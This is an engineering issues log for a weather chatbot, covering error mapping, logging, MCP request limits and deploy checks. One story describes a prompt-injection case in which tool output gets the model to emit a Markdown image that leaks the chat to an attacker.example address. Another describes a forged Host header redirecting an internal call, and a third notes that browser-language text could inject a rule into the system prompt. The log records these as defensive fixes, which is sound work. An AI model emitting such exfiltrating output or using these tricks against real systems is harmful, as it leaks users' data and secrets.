# Issues and Fixes

Every problem we met while building and deploying Nimbus, and how it was fixed. Each build step adds its own, in
the same change as its code; the newest step is last. An entry says what happened and why, then the fix, and what
now checks it, so it can't quietly come back. *Found by* says how it surfaced: **testing a real API**, **checking our
work** (the type check, the tests, screenshots, contrast), the **review** that every step gets from an independent
reviewer before its commit, **reading a package's code**, or **deploying**. The bug stories come first: the real bugs,
each told in full.

## Bug Stories: Found, Traced, Fixed, Verified

Most entries in the log are small. These nine were real bugs or holes, the kind worth telling in an interview. Each
story gives the request that went wrong, what we saw, why it happened, how we traced it, how we fixed it, and how we
checked the fix, with the test that now keeps it fixed. The entry numbers point into the log below.

| # | Story | Step | Found by |
|---|---|---|---|
| 1 | A bad tool call blamed the assistant | 5 | our own test, then the review |
| 2 | One answer, two endings | 5 | the review |
| 3 | A slow weather service, reported as the model failing | 3 and 4 | the review |
| 4 | One request, a hundred tool calls | 4 | the review |
| 5 | The MCP call's address came from a header | 4 | the review |
| 6 | An image that could carry the chat away | 3 | the review |
| 7 | The golden questions met the live site | 3 | deploying |
| 8 | The deploy check that never saw CI finish | 2 | deploying |
| 9 | A test that couldn't fail | 2 | the review |

### 1. A bad tool call blamed the assistant

*Step 5 · found by our own test, then the review · entries 54 and 60*

**The request.** You ask for Paris's weather "for the next month". Gemini calls `get_forecast` with
`{"latitude": 48.8534123, "longitude": 2.3488123, "days": 30, "includeHourly": false, "units": "metric"}`, but the tool
takes at most 16 days. Models make such mistakes: a number out of range, a missing field, a tool that doesn't exist.
AI SDK checks every call's input against the tool's schema, doesn't run a bad call, and tells the model, which can
call again with 16.

**What went wrong.** The chip for that call said "The assistant didn't answer. Please try again.", as if Gemini were
down, while it was answering and about to correct itself. And no log line said a bad call had happened.

**Why it happened.** AI SDK 7 sends the page two chunks for a bad call: `tool-input-error`, built from its error object
(`InvalidToolInputError`), and `tool-output-error`, built from only that error's text,
`"AI_InvalidToolInputError: Invalid input for tool get_forecast: …"`. The chip shows the last one. Our code chose the
sentence by the error's class, so the object got the right sentence and the text got the general one. The logs missed
it for another reason: they were written when a tool ran, and a bad call never runs.

**How we traced it.**

1. Step 3's review had flagged that bad input got the general sentence. That fix gave the error object its own
   sentence, and its unit test passed, but the test called our function with the object, not with what the page
   receives.
2. Step 5's acceptance test, `tests/unit/chat/error-map.test.ts`, plays every error class through a whole chat turn:
   AI SDK's mock model in place of Gemini, the real AI SDK and lane, and the chunks as the page reads them. Its
   bad-call case found two sentences, the right one and "Something went wrong. (ref b1a0d9e8)", and no `tool.call`
   line.
3. A throwaway test printed every chunk and every error AI SDK handed our code: first the error object, then a plain
   string. The step's own record showed where the real error is kept: on the `tool-call` part, marked `invalid: true`.
4. A call to a tool that doesn't exist (`get_tides`) showed the same pair, as `AI_NoSuchToolError`.
5. Step 4's code sent any text to the general sentence: the chip had been wrong since step 3.

**How we fixed it.**

- `lib/errors.ts` knows a bad call from the error or from its text, by AI SDK's two names for it, and makes it a
  `BadToolCallError`: "The assistant called a weather tool the wrong way.", logged at warn, since the model gets
  another try.
- `lib/chat/run-chat.ts` writes the bad call's line from the step's invalid `tool-call` part, since no tool ran to
  write it.
- The review then caught that this new line copied AI SDK's message, which quotes the model's input:
  `Type validation failed: Value: {"latitude":48.8534123,"longitude":2.3488123,"days":30,…}`. That's a place, to 7
  decimals, in the logs. The line now says what went wrong in our own words ("The model's input didn't match the
  tool's input schema."), never the input, and names the tool only if it's one of ours.

**How we confirmed it.** The acceptance test failed before each fix and passes after: one sentence on the chip, one
`tool.call` line at warn with `BadToolCallError`, and none of `48.8534123`, `2.3488123` or `"days":30` in any line.
`tests/unit/errors.test.ts` covers the error and both of its text forms. It can't be forced on the live site, since it
needs Gemini to make the mistake; when it happens, the logs show `"errorClass":"BadToolCallError"`.

**The lesson.** Test what the user sees, not the function in between: the same failure can reach you in two shapes,
and a fix tested on one of them can leave the other broken.

### 2. One answer, two endings

*Step 5 · found by the review · entry 61*

**The request.** A question whose first model call works (it asks to geocode Paris) and whose second fails: Gemini
answers `400` ("API key expired"), or `503`, or `429` once the free tier's quota is used up.

**What went wrong.** The answer's lines ended twice: `chat.failed` at error, then `chat.done` at info, as if it had
finished as well. A dashboard of answers would have counted it as a failure and a success.

**Why it happened.** We log `chat.done` from AI SDK's `onEnd` and `chat.failed` from its `onError`, assuming one or the
other. But when AI SDK's stream closes, it calls `onEnd` whenever a step was recorded and the run wasn't aborted, even
after `onError`. Our test of a model failure failed on the first call, before any step was recorded, so it never saw
this.

**How we traced it.** The reviewer read the stream's `flush` in AI SDK's built code (`ai/dist/index.js`, 7.0.156): it
has no check for an earlier error. We wrote the test that should show it, a mock model that asks for a tool on its
first call and fails its second with Gemini's `APICallError`, and it failed with
`["info upstream.http", "info tool.call", "info model.step", "error chat.failed", "info chat.done"]`.

**How we fixed it.** `runChat` notes in `onError` that the answer failed, and `onEnd` then skips `chat.done`; it still
closes the lane.

**How we confirmed it.** The test now ends on `"error chat.failed"`, with `ModelError` and Gemini's error as its cause.
With the check switched off, the same test fails again, so it guards the fix.

**The lesson.** Test the order of a library's callbacks, not only each one: the contract you assume ("failure or
success, never both") may not be the one the library keeps.

### 3. A slow weather service, reported as the model failing

*Steps 3 and 4 · found by the review · entries 32, 34 and 46*

**The request.** "Do I need an umbrella in Paris tomorrow?" while Open-Meteo is slow. Each tool call has 8 s, two tries
of 3 s with a short wait between, and the forecast isn't back in time.

**What went wrong, three times.**

- Step 3: the chip said "The assistant didn't answer." The model was fine; the weather service was slow.
- Step 3 too: pressing Stop during a tool call would have been logged as a failure.
- Step 4: with the first fix in place on REST, the same slow call through `MCP · no auth`, the default lane, said "The
  assistant didn't answer" again, and neither function logged it.

**Why it happened.** When a tool's budget runs out, AI SDK fires the tool's abort signal with a `TimeoutError`. Step 3's
Open-Meteo client passed that error on as it was, and any error that wasn't ours got the general sentence. Stop fires
the same signal, but Next.js aborts it with its own `ResponseAborted` error, not `AbortError`, so a check for
`AbortError` couldn't tell a stop from a failure. On MCP, the failed call's error is the MCP client's own,
`MCPClientError: Request was aborted`, wrapped around the abort, and the first fix never looked at it.

**How we traced it.** Each time, the reviewer followed one failure along its path and checked it against the
framework's code: the budget's `TimeoutError` through `lib/upstream/open-meteo.ts`; Next.js's request adapter
(`next/dist/server/web/spec-extension/adapters/next-request.js`) for Stop; the MCP lane's `callTool` error path. Our
own MCP test showed the wrapping: a stopped call came back as the client's error, not as the signal's reason.

**How we fixed it.** One helper, `toAbortKind(signal)` in `lib/utils.ts`, says why a signal fired: "timeout" when its
reason is a `TimeoutError`, "stop" for any other reason (Next.js's included), "none" when it hasn't fired. Every lane
uses it: a time limit becomes `UpstreamTimeoutError` ("The weather service took too long to answer."), and a stop is
passed on as the signal's own reason, and isn't logged as a failure.

**How we confirmed it.** A test on each path: the client (`tests/unit/upstream/open-meteo.test.ts`); each lane, with a
time limit and a `ResponseAborted` stop (`tests/unit/lanes/rest-no-auth.test.ts`,
`tests/unit/lanes/mcp-no-auth.test.ts`); the helper itself (`tests/unit/utils.test.ts`); and step 5's acceptance test,
for the chip's sentence and its warn line.

**The lesson.** When a fix is about how a kind of failure looks, put it where every path goes through it. Otherwise a
new path, here a new lane, brings the old bug back.

### 4. One request, a hundred tool calls

*Step 4 · found by the review · entries 45 and 65*

**The request.** Not a chat question: anyone can POST to `/api/mcp`, our public MCP server, a JSON-RPC batch, an array
of `tools/call` messages, in one HTTP request.

**What could go wrong.** Each message is a tool call, and each tool call asks Open-Meteo, twice if it retries. A rate
limit that counts requests, like step 8's, would see one request while our servers made up to 200 calls to Open-Meteo.

**Why it happened.** The MCP SDK still serves 2025-era clients, and that path takes a batch of up to 100 messages (its
`MAX_BATCH_SIZE`), in a body of up to 4 MB.

**How we traced it.** The reviewer asked what one request to a public endpoint can make it do, and read how the MCP SDK
reads a body. Writing this story, we checked the numbers in the SDK's own code: entry 45 had said "thousands", and the
cap is 100 (entry 65).

**How we fixed it.** `lib/weather/mcp-request.ts` checks every request before the MCP server sees it: one JSON-RPC
message, at most 8 KB, valid JSON. Anything else gets a JSON-RPC error with `400` or `413`.

**How we confirmed it.** `tests/unit/weather/mcp-request.test.ts` covers a batch, a large body (by its declared size and
by what arrives), a body that isn't JSON, and one message passed on intact. On the live site, on 29 October 2026: a
batch of two got `400` ("This server takes one message at a time."), a 9 KB body got `413` ("A message can be at most
8192 bytes."), a `GET` got `405`, and a real MCP client still listed and called the tools.

**The lesson.** A public endpoint's limits must count the work a request asks for, not the requests. And check a
finding's numbers in the code before you repeat them.

### 5. The MCP call's address came from a header

*Step 4 · found by the review · entry 47*

**The request.** A chat request on `MCP · no auth` with a forged `Host` header: `attacker.example`, say.

**What could go wrong.** The MCP lane calls `/api/mcp` on this same deployment, and step 4's first version took that
address from the request, and so from its `Host` header. A forged header would send the call, with the bypass secret
when the project has one, to another server.

**Why it happened.** On Vercel it was safe, since Vercel only routes its own domains to us; but the code trusted a
header that, anywhere else, the caller sets.

**How we traced it.** The reviewer followed the lane's URL back to where it came from: the request's own address.

**How we fixed it.** `toSelfOrigin` in `lib/lanes/open-lane.ts`: on Vercel, the request's address only if it's one of
the deployment's own (its URL, its branch's, the production domain, as Vercel lists them), else the deployment's own
URL; on a laptop, the request's address.

**How we confirmed it.** `tests/unit/lanes/open-lane.test.ts`: the production and branch addresses are kept, a forged
one becomes the deployment's URL, and a laptop keeps its own. On the live site, a real answer's chips show the call
going to `https://weather-chatbot-hazel.vercel.app/api/mcp`.

**The lesson.** Never build an address to call, least of all one that carries a secret, from a header the caller
controls.

### 6. An image that could carry the chat away

*Step 3 · found by the review · entry 28*

**The request.** A question whose tool result holds text that gets the model to put an image in its answer:
`![map](https://attacker.example/pixel.png?chat=what-you-asked)`. That's prompt injection: words in data the model
reads, acting as instructions.

**What could go wrong.** The page shows the answer as Markdown, and a browser fetches an image as soon as it's shown,
so whatever the model put in the image's address would go to that server, with no click. And links opened in the same
tab, so a click would wipe the chat.

**Why it happened.** Markdown viewers show images by default, and the answer is text the model wrote, partly from tool
results we don't control.

**How we traced it.** The reviewer read `components/chat-message.tsx`, where the answer's Markdown was shown with
react-markdown's defaults, with one question in mind: what can the model's text make the page do by itself?

**How we fixed it.** A component of its own for the answer, `components/answer-markdown.tsx`: no images
(`disallowedElements`), and links that open in a new tab, with `rel="noopener noreferrer"`. Raw HTML was already off.

**How we confirmed it.** The fix had no test until we wrote this story. Now `tests/e2e/chat-page.spec.ts` replays such
an answer in a real browser, and checks that no `img` is shown, that no request goes to the image's server, and that
the link opens in a new tab. With images allowed again, it fails ("Expected: 0, Received: 1"), so it guards the fix.

**The lesson.** Treat a model's output like user input: anything it can make the page do by itself, an attacker can
make it do.

### 7. The golden questions met the live site

*Step 3 · found by deploying · entries 38 and 39*

**The request.** `npm run evals` asks the live site five golden questions and checks each answer against the tool
results, among them "What's the weather in Tokyo right now?"

**What went wrong.** First nothing reached the site: Node failed every request with `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`.
Then four of five passed, and Tokyo failed, though its answer, "overcast with a temperature of 11.9°C (feeling like
11.2°C)", was right.

**Why it happened.** This laptop's HTTPS goes through a certificate that Windows trusts and Node's own list doesn't.
The browser and Python's standard library worked, since they read Windows' list; pip, with a list of its own, fails
here too. And the Tokyo check wanted the rounded 12, while the plan's rule allows the tool's value as it is or
rounded; the model gave the tool's exact 11.9.

**How we traced it.** The error's `code` named the certificate problem, and the same request from Python's standard
library worked, which pointed at Node's own list. For Tokyo, we put the answer next to the tool result from the same
run: the numbers matched, so the check was wrong, not the bot.

**How we fixed it.** On such a machine, Node runs with `NODE_OPTIONS=--use-system-ca` (the README says so; Vercel's
servers don't need it). The Tokyo check accepts the value as it is or rounded, as the rule says.

**How we confirmed it.** The golden questions then passed five of five on the live site; on 29 October 2026 they passed
on both no-auth lanes, ten of ten, along with the MCP server's own check.

**The lesson.** An eval checks a rule, not a wording. When one fails, put the answer next to its tool results before
blaming the bot or the test.

### 8. The deploy check that never saw CI finish

*Step 2 · found by deploying · entry 16*

**The request.** After a push, a script on the developer's laptop waits for two things: the live site showing the new
build, and GitHub's CI run for that commit passing. It asked GitHub's API for `/actions/runs?head_sha=6dac3d5` every
15 seconds.

**What went wrong.** It never saw CI finish, though CI had passed all along.

**Why it happened.** GitHub's `head_sha` filter matches only a full, 40-character commit id, so the short `6dac3d5`
matched no run. And GitHub allows 60 unauthenticated requests an hour, which a check every 15 seconds uses up in 15
minutes.

**How we traced it.** The commit's page on GitHub showed CI had passed, so the script was what failed. Its question
named the commit by its short id, which the filter doesn't take; and its pace was set without looking at the limit.

**How we fixed it.** The script gets the full id with `git rev-parse`, asks at most once a minute, so an hour's wait
stays inside the limit, and prints the API's own errors instead of a silent "not yet".

**How we confirmed it.** Every deployment since has reported both. Step 4's push, for example, was live as `66f3e05`
after 47 seconds, and its CI run had passed by 63 seconds (run 40956543196).

**The lesson.** Before polling an API, read its matching rules and its rate limits, and print what it says: a silent
"not yet" hid both problems.

### 9. A test that couldn't fail

*Step 2 · found by the review · entry 8*

**The request.** The browser test "opens a tool chip" clicked a chip and checked that its request was on the page.

**What went wrong.** It passed whether the chip opened or not.

**Why it happened.** Playwright's `toContainText` reads all the text inside an element, including what a closed
`<details>` hides, so the request's text was "there" either way.

**How we traced it.** The reviewer asked of each test what change would make it fail, and for this one, nothing would.

**How we fixed it.** The test checks the chip's `open` attribute, absent before the click and present after, and that
the request is visible, not only there.

**How we confirmed it.** The test, in `tests/e2e/chat-page.spec.ts`, asserts `not.toHaveAttribute("open")` before the
click and `toHaveAttribute("open")` after, so a chip that stays closed fails it. It passes in every run, on a desktop
and on a 360-pixel phone screen.

**The lesson.** For each test, ask what would make it fail. If the answer is "nothing", it proves nothing.

## While Planning

1. **The "no auth" MCP server needed a sign-in.** *Testing a real API.* MCPBundles' Open-Meteo server answered an MCP
   `initialize` with `401` and `WWW-Authenticate: Bearer`: it's an auth server. **Fix:** the MCP no-auth lane is our
   own MCP server at `/api/mcp` (step 4); `PLAN.md`, section 3, row 1.
2. **Open-Meteo answered in GMT.** *Testing a real API.* The Dallas example, as given, said "now" was 17:00 when it
   was 12:00 in Dallas, and worked out the days on GMT days. **Fix:** every request sends `timezone=auto`. **Check:**
   `tests/unit/upstream/open-meteo.test.ts`.
3. **The design's bot text was hard to read.** *Checking our work* (the design image's pixels). White text on the teal
   bubble is 2.15:1; the minimum is 4.5:1. **Fix:** dark teal text, 5.82:1. **Check:** the axe scan in the end-to-end
   tests.

## Step 1 · The Project Skeleton

4. **Empty settings failed the settings check.** *Review.* `vercel env pull` writes some variables as empty strings, and
   an empty `VERCEL_GIT_COMMIT_SHA` broke the settings check that runs when the app starts. **Fix:** an empty value
   counts as missing (`lib/config.ts`). **Check:** `tests/unit/config.test.ts`.
5. **Lint passed with warnings.** *Review.* Biome exits with success when it finds only warnings, so a rule set to
   warn would never fail CI. **Fix:** `npm run lint` runs `biome check --error-on-warnings`.
6. **The first build-skipping command missed commits.** *Review.* Comparing with `HEAD^` looks at the last commit
   only, so a push of several commits could skip a change made in an earlier one. **Fix:** compare with
   `$VERCEL_GIT_PREVIOUS_SHA`, the last deployed commit.
7. **Every push to the repository redeploys this app.** *Deploying.* After step 1, the live build line showed
   `d053b8c`, a commit that changed only the IT Knowledge Base project; Vercel's deployment list shows it built and
   deployed. The project's "Skip deployments when there are no changes to the root directory" switch is on, but it
   only works in a monorepo with npm, Yarn, pnpm or Bun workspaces: without them, Vercel treats a change anywhere as
   global, and this repository has none. **Fix:** an Ignored Build Step command that compares this folder with the
   last deployed commit, `git diff --quiet "$VERCEL_GIT_PREVIOUS_SHA" HEAD -- .` (README, "Deploy it on Vercel", item
   4). **Status:** waiting to be set in the project's settings; until then, each push rebuilds the same code, which
   costs build minutes and nothing else.

## Step 2 · The Chat Page, From a Sample

8. **A test passed without proving anything.** *Review.* Playwright's `toContainText` reads the text inside a closed
   `<details>`, so "opens a tool chip" passed whether the chip opened or not. **Fix:** the test checks the `open`
   attribute, and that the request is visible.
9. **Code that only the tests used.** *Review.* A duration formatter and the chips' running and failed states had no
   caller yet: against the repo's rule. **Fix:** taken out, and brought back in step 3, which uses them.
10. **The end-to-end tests needed Microsoft Edge.** *Review.* They'd fail on macOS, Linux or in Codespaces. **Fix:**
    Playwright's own Chromium by default (`npx playwright install chromium`); `E2E_BROWSER_CHANNEL=msedge` uses Edge.
11. **A preview's secret could land in trace files.** *Review.* A trace records every request header, the Deployment
    Protection bypass secret included. **Fix:** no traces while that secret is set.
12. **Two MCP calls shared one JSON-RPC id.** *Review.* MCP forbids that within a session. **Fix:** ids 2 and 3, as
    the plan has them.
13. **The chips lost their open/closed arrow.** *Review.* A `<summary>` laid out as a flex row hides the browser's
    arrow. **Fix:** the chip draws its own, ▸ and ▾.
14. **Grey on mint was too faint.** *Checking our work* (contrast). The selected lane's "live from step" line was
    4.45:1. **Fix:** dark teal on the selected lane.
15. **Tables scrolled sideways on a phone.** *Checking our work* (a 360-pixel screenshot). **Fix:** tables fit the
    width, and long words wrap. **Check:** an end-to-end test that no page scrolls sideways.
16. **The deploy check never saw CI finish.** *Deploying.* Our deploy-checking script (a helper on the developer's
    machine, not in the repo) asked GitHub's API for the run of `6dac3d5` with a short commit id, but the `head_sha`
    filter matches only the full 40 characters; and it asked every 15 s, against GitHub's limit of 60 unauthenticated
    requests an hour. CI had passed all along. **Fix:** the script resolves the full id with git, asks at most once a
    minute, so one check of up to an hour stays inside the limit, and prints the API's own error messages.

## Step 3 · The Live Chat, Through REST · No Auth

17. **Atlantis is a real town.** *Testing a real API.* The plan's "can't find this place" question used Atlantis, and
    Open-Meteo found Atlantis, Western Cape, South Africa (82,736 people). **Fix:** the golden question uses Hogwarts,
    which returns nothing.
18. **Places come by relevance, not population.** *Testing a real API.* Springfield gives Missouri, Illinois, then
    Massachusetts, which is larger than Illinois. **Fix:** the ambiguity rule sorts by population itself. **Check:**
    `tests/unit/weather/ambiguity.test.ts`, on the recorded answers.
19. **A country code didn't narrow "Springfield".** *Testing a real API.* With `countryCode=US`, Springfield still
    gave all five, since all five are in the US. A region after a comma does narrow it: "Springfield, MA" gives
    Massachusetts first. **Fix:** the system prompt tells the model to write a region after a comma.
20. **Some places have no population.** *Testing a real API.* Narnia's three candidates have none. **Fix:** an
    unknown largest population counts as ambiguous, so the bot asks.
21. **AI SDK's `tool()` helper couldn't type our generic tools.** *Checking our work* (the type check). Its overloads
    can't resolve a generic input. **Fix:** the lane builds each tool object with its type written out; tool results
    are typed as JSON, so the compiler checks that the model can read them.
22. **The SDK's docs and its code disagree.** *Reading a package's code.* A tool's time limit only fires its abort
    signal, and doesn't stop the tool: our tools pass that signal to every request. A server-side time limit leaves
    the page with no error at all: the answer now carries a "cut short" mark, and the page says so.
    `@ai-sdk/react` 4.0.161 would install a second copy of `ai`: it's pinned to 4.0.160.
23. **Gemini's provider looks for another variable.** *Reading a package's code.* `@ai-sdk/google` reads
    `GOOGLE_GENERATIVE_AI_API_KEY`, and only at the first call. **Fix:** `lib/chat/model.ts` passes our
    `GOOGLE_API_KEY` itself, and checks for it first, so a missing key gets "isn't set up yet" at once.
24. **Line endings broke the format check.** *Checking our work* (Biome). Files a script rewrote on Windows got
    `\r\n` line endings in the working folder, and Biome's format check refused them. **Fix:** the scripts write `\n`.
    (`.gitattributes`, from step 1, keeps `\n` in what git stores, but can't change what a script writes.)
25. **Browser tests failed under load.** *Checking our work* (the tests). Run alongside a build, 7 checks timed out (an
    accessibility scan took 42 s); run alone, all passed in 15 s. **Watch:** CI's runs.
26. **A long history went to Gemini unchecked.** *Review, high.* Only your own text was measured; the bot's earlier
    answers and tool outputs had no limit. **Fix:** the whole history is at most 200,000 characters, with only the
    parts the page sends and each earlier tool call checked; the page sends only the recent messages.
27. **The browser's language went into the system prompt as is.** *Review.* Any 35 characters, new lines included,
    could add a rule. **Fix:** only a language tag, as `Intl` reads it, gets through.
28. **The model's Markdown could load images.** *Review.* An image link is fetched as soon as it's shown, which is how
    a tool's text could leak data out; and links opened in the same tab, wiping the chat. **Fix:** no images; links
    open in a new tab.
29. **An answer could end on tool calls, with no words.** *Review.* If the 5th step still called tools, the run
    stopped there. **Fix:** the 5th step can't call a tool. **Check:** `tests/unit/chat/run-chat.test.ts`.
30. **The 11th question would fail forever.** *Review.* The page sent the whole chat, so the 21st message broke the
    20-message limit, and Try again repeated it. **Fix:** the page sends the recent messages only, and New chat starts
    over.
31. **Model failures left no trace in Vercel's logs.** *Review.* A bad key or a used-up quota showed one sentence,
    and nothing else. **Fix:** `lib/logger.ts` logs each failure as one JSON line: its class and our message, never
    the question. Step 5 makes it the full logger.
32. **A Stop would have been logged as a failure.** *Review.* When the browser closes the connection, Next.js aborts
    the request with its own `ResponseAborted` error, not an `AbortError`, so a check for `AbortError` missed it.
    **Fix:** a stop is any abort whose reason isn't the tool's own time budget. **Check:**
    `tests/unit/lanes/rest-no-auth.test.ts`.
33. **Vercel's own error pages could reach the page.** *Review.* A `504` with Vercel's text would have been shown as
    is. **Fix:** the chat marks its own error responses; anything else becomes "The chat couldn't be reached."
34. **A tool's time limit said "The assistant didn't answer".** *Review.* The tool's 8 s limit came through as a raw
    abort. **Fix:** it's the weather service being slow, and the chip says so.
35. **Stopped tool calls kept running, on screen.** *Review.* After Stop, or a time limit, an unfinished chip showed
    "…" for good. **Fix:** it shows as stopped.
36. **Smaller review findings.** The wire view left out a header the request sends; the "checking the weather" text
    faded below its contrast while it pulsed; a browser test that forgot to answer `/api/chat` could have reached
    Gemini (now such a request fails by default); the Stop test relied on a fixed 5-second window; a link worked in
    the app but not on GitHub. **Fix:** each one, with a test where one fits.
37. **A README output mixed two runs.** *Checking our work* (the docs). The build output pasted into the README had
    times from one run and lines from another, and its route tree from before a new page. **Fix:** outputs are copied
    whole from one captured run.
38. **Node couldn't check HTTPS certificates on this laptop.** *Deploying* (the live checks). The golden questions
    failed before reaching the model: `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`. This machine's HTTPS goes through a
    certificate that Windows trusts but Node's own list doesn't (pip has the same trouble here); the browser and Python
    use Windows' list, which is why they worked. **Fix:** on such a machine, run Node with
    `NODE_OPTIONS=--use-system-ca`, which trusts Windows' list. Vercel's servers don't need it.
39. **A golden question's check was stricter than the rule.** *Deploying* (the live checks). Tokyo's answer gave
    11.9 °C, the tool's exact value; the check wanted the rounded 12, though the plan's rule allows either. **Fix:**
    the check accepts the value as it is or rounded. One more model call went on re-asking, because an edit to the
    check hadn't saved first.
40. **The key had to be set up on Vercel.** *Deploying.* The chat reads `GOOGLE_API_KEY` from Vercel's settings. It
    was added as a Sensitive variable, so its value can't be read back from the dashboard, for Production only. We
    checked it by name, not by value. Preview deployments won't have it: tick Preview too, to chat on them. A setting
    reaches the next deployment, not the running one.

## Step 4 · MCP · No Auth, Through Our Own MCP Server

41. **The plan's MCP handshake is now one request.** *Reading the requests.* AI SDK's MCP client and `mcp-handler`
    speak MCP's 2026-07-28 version, which keeps no session: the client opens with one `server/discover`, not
    `initialize` and its follow-up notice, and every request names its method and tool in headers (`mcp-method`,
    `mcp-name`) and carries the protocol version and the client's name in `_meta`. **Fix:** the docs and the compare
    view show the request as it's really sent; the server still answers 2025-era clients.
42. **An MCP tool result may have no content list.** *Checking our work* (the type check). The client types a tool
    result as a union of the current form and older ones, some without `content`. **Fix:** the lane reads the text
    only when `content` is a list.
43. **Error classes by name.** *Checking our work* (lint). The MCP server sends a failed tool's class by name; a map
    keyed by class names broke the naming rule, and a class's own constructor name can change when the code is
    minified. **Fix:** a `switch` over the names each class sets itself (`toAppErrorByName`).
44. **MCP's `_meta` key broke a naming rule.** *Checking our work* (lint). `_meta` is MCP's name, not ours, and its
    leading underscore failed the file's naming rule. **Fix:** that file's rule ignores one leading underscore.
45. **One request could carry 100 tool calls.** *Review, high.* `/api/mcp` is public, and the MCP SDK takes a JSON-RPC
    batch of up to 100 messages, in up to 4 MB, on its 2025-era path: one POST could make up to 200 Open-Meteo calls
    from our servers (with retries), past any per-request rate limit (entry 65 corrects "thousands"). **Fix:** each
    request is checked first: one message at a time, at most 8 KB (`lib/weather/mcp-request.ts`). **Check:**
    `tests/unit/weather/mcp-request.test.ts`.
46. **MCP undid a time-limit fix.** *Review.* On MCP · no auth, a tool past its 8 s budget came through as a raw abort
    ("The assistant didn't answer"), unlogged on both sides: entry 34's problem again, on the default lane. **Fix:**
    one helper, `toAbortKind`, tells a time limit from a stop for every lane; a time limit is logged and becomes
    `UpstreamTimeoutError`. **Check:** `tests/unit/lanes/mcp-no-auth.test.ts`.
47. **The MCP call's address came from the request's Host header.** *Review.* Safe on Vercel, which only routes its own
    domains here; but on any other host, a forged `Host` could send the call, and the bypass secret, elsewhere. **Fix:**
    on Vercel, the lane uses the request's address only if it's one of the deployment's own (Vercel lists them), else
    the deployment's own URL. **Check:** `tests/unit/lanes/open-lane.test.ts`.
48. **A cached MCP answer said no request went out.** *Review.* On MCP the `tools/call` does go out; only the server's
    call to Open-Meteo is skipped. **Fix:** the chip says "cached", keeps the call's time, and explains per lane.
49. **A failed connection lost its cause.** *Review.* A preview's `401` from Deployment Protection became "can't be
    reached", and only that was logged. **Fix:** the original error is kept as the cause and logged with its own class.
50. **The public server could send a bug's own text.** *Review.* A failure that wasn't ours (a `TypeError`, say) went
    to any MCP client as it was. **Fix:** a fixed sentence, "The weather tool failed unexpectedly."
51. **MCP's untested paths.** *Review.* Stop, the tool's time budget, two calls at once, a missing tool and a failed
    tool list had no test on MCP, and one test waited 3 real seconds. **Fix:** a test for each; the connect budget can
    be passed in.
52. **A failed connection was logged twice, and a Stop once.** *Review.* The lane logged a failed MCP connection, then
    the chat route logged it again, and the route also logged a Stop during connecting as a failure. **Fix:** a failure
    is logged once, where it happens: the lanes log their own; the route logs only a missing setting and anything
    unexpected, and never a stop.
53. **Only one production domain is known.** *Review.* Vercel names the shortest production domain only; with a custom
    domain added, chats through the `vercel.app` address would call the protected deployment URL. **Fix:** the deploy
    notes say to turn on Protection Bypass for Automation along with adding a domain.

## Step 5 · Errors and Logs

54. **A bad tool call's chip said "The assistant didn't answer."** *Checking our work* (the tests). AI SDK 7 sends a bad
    call to the page twice: once for its input, with AI SDK's own error, and once for its output, with only that error's
    text (`"AI_InvalidToolInputError: ..."`). Our sentence matched the error itself, so the chip, which shows the
    second, got the general sentence: since step 3. **Fix:** `toAppError()` knows AI SDK's two bad-call names in the
    text too; the log line comes from the tool call itself, which AI SDK marks `invalid`. **Check:**
    `tests/unit/chat/error-map.test.ts`, `tests/unit/errors.test.ts`.
55. **pino's default stream could drop a function's last lines.** *Reading a package's code.* Without a destination,
    pino writes to stdout through sonic-boom without waiting, so a function that ends right after a line, as each answer
    does with `chat.done`, could stop before the line is out. **Fix:** `pino.destination({ dest: 1, sync: true })`.
    **Check:** the live logs, after the deployment.
56. **Our MCP server's setup can't see the request.** *Reading a package's code.* mcp-handler builds a fresh MCP
    server for every request, but the setup function it calls isn't given the request, so it can't read the request
    id there. **Fix:** each tool reads it from the request the MCP SDK passes the tool (`ctx.http.req`). **Check:**
    `tests/unit/weather/register-tools.test.ts`.
57. **The chat id went into the logs as sent.** *Checking our work.* useChat makes the chat's id from letters and
    digits, but any client could send an email address in it, and every line logs it. **Fix:** an id must look like
    one useChat makes, or the request is refused. **Check:** `tests/unit/chat/chat-request.test.ts`.
58. **The tests' model failures weren't Gemini's.** *Checking our work* (the tests). A plain `Error` from the mock
    model, as step 3's test threw, now reads as a bug; and a 503 made AI SDK retry twice, for about 6 s, past the test's
    5 s. **Fix:** the tests throw what AI SDK throws for Gemini: an `APICallError`, and after its retries a
    `RetryError`.
59. **Sentry needs your account.** *Checking our work.* The plan had Sentry in this step, but it needs an account and a
    project key that only you can create. **Fix:** it moves to step 9, with the other services that take the logs
    elsewhere; the plan and step 5's page say so.
60. **A bad call's log line quoted the model's input.** *Review.* AI SDK's message for invalid input embeds the input
    itself (`Type validation failed: Value: {...}`), and our line logged it twice, as the message and as the cause: a
    place, or coordinates to 7 decimals, in the logs. **Fix:** a bad call's line says what went wrong in our own words,
    with no cause, and names the tool only if it's one of ours. **Check:** `tests/unit/chat/error-map.test.ts`.
61. **A model failure after a finished step ended twice.** *Review.* AI SDK calls `onEnd` once any step has finished,
    even after `onError`, so Gemini failing on its second call logged `chat.failed`, then `chat.done`. **Fix:**
    `chat.done` is skipped once the answer has failed. **Check:** `tests/unit/chat/run-chat.test.ts`, a model that
    fails on its second call.
62. **Anyone could file `/api/mcp`'s lines under any id.** *Review.* The public server takes a caller's `x-request-id`,
    so an outside client could put its lines under a chat's id, and Vercel's own id for the request was never logged.
    **Fix:** each line there also carries `invocationId`, Vercel's id for that request. **Check:**
    `tests/unit/weather/register-tools.test.ts`.
63. **Every AI SDK error read as the model failing.** *Review.* Our own messages failing to convert
    (`MessageConversionError`) and the MCP client's errors are AI SDK errors too, so they'd have said "The assistant
    didn't answer" and counted as worth retrying. **Fix:** `ModelError` is only for Gemini's own failures as AI SDK
    reports them: an HTTP error, its retries giving up, an error inside the stream (a `StreamProviderError`, which AI
    SDK makes from Gemini's error chunk), or no answer; anything else is a bug. **Check:** `tests/unit/errors.test.ts`.
64. **A question's hash could be guessed back.** *Review.* An unsalted SHA-256 of "Weather in Paris?" is found by
    hashing likely questions, so the hash was the question in another form. **Fix:** only the question's length is
    logged; `hashText` is gone, from the code and the plan.
65. **Entry 45 said "thousands".** *Checking our work* (writing the bug stories). The MCP SDK caps a batch at 100
    messages (`MAX_BATCH_SIZE` in `@modelcontextprotocol/server` 2.4.0), so one request could carry up to 100 tool
    calls. **Fix:** entry 45, step 4's page, the guard's comment and its test say so; the guard stays, since a
    per-request limit still counts those 100 calls as one.
